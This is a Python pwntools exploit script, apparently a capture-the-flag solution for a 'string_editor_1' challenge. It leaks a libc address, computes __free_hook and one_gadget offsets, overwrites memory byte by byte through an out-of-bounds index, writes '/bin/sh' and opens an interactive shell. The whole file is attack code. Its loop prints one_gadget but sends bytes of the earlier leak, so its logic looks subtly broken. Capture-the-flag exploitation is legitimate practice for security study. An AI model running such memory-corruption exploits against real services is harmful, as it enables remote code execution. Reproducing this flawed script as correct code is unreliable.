from pwn import *

# p = process('./string_editor_1')
p = remote('chal.imaginaryctf.org', 42004)
# pid= gdb.attach(p,gdbscript='''
# 	b * main+171 
# 	b * main+275
# 	''')

p.recvline()
p.recvline()



leak = int(p.recvline().split(' ')[7],16)

libc_base = leak - 0x0000000000055410

one_gadget = libc_base + 0x10a41c #0xe6e73

free_hook = libc_base + 0x0000000001eeb28
p.sendlineafter(')\n','0')
p.sendlineafter('index?\n','1')

leak_heap = int(p.recvline().split(' ')[1],16)

print "libc_base: ",hex(libc_base)
print "heap: ",hex(leak_heap)
print "one_gadget: ",hex(one_gadget)
print "free_hook: ",hex(free_hook)
dist = free_hook - leak_heap

for i in range(6):
	print "one_gadget: "+hex(one_gadget)

	to_send = leak & 0xff
	print "sent: ",hex(to_send)
	leak= leak >> 8
	p.sendlineafter(')\n',str(dist))
	p.sendlineafter('index?\n',chr(to_send))
	dist +=1

bin_sh = '/bin/sh\0'
for i in range(8):
	p.sendlineafter(')\n',str(i))
	p.sendlineafter('index?\n',chr(ord(bin_sh[i])))


p.sendlineafter(')\n','15')
p.interactive()
